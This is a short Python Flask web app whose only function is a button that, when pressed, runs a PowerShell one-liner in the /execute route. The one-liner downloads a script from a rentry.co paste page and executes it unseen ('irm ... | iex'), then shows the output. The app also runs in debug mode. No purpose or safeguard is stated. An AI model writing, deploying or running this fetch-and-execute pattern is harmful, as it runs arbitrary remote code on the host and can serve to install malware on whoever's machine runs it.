
from flask import Flask, render_template_string, request
import subprocess

app = Flask(__name__)

# HTML template with a button to trigger the PowerShell command
HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>Execute PowerShell Command</title>
</head>
<body>
    <h1>Execute PowerShell Command</h1>
    <form method="post" action="/execute">
        <button type="submit">Run Command</button>
    </form>
    {% if output %}
    <h2>Command Output:</h2>
    <pre>{{ output }}</pre>
    {% endif %}
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/execute', methods=['POST'])
def execute():
    try:
        # PowerShell command to be executed
        command = 'powershell -Command "irm rentry.co/Testy123/raw | iex"'
        
        # Execute the PowerShell command
        result = subprocess.run(command, capture_output=True, text=True, shell=True)
        
        # Capture the output
        output = result.stdout if result.returncode == 0 else result.stderr
    except Exception as e:
        output = str(e)
    
    return render_template_string(HTML_TEMPLATE, output=output)

if __name__ == '__main__':
    app.run(debug=True)
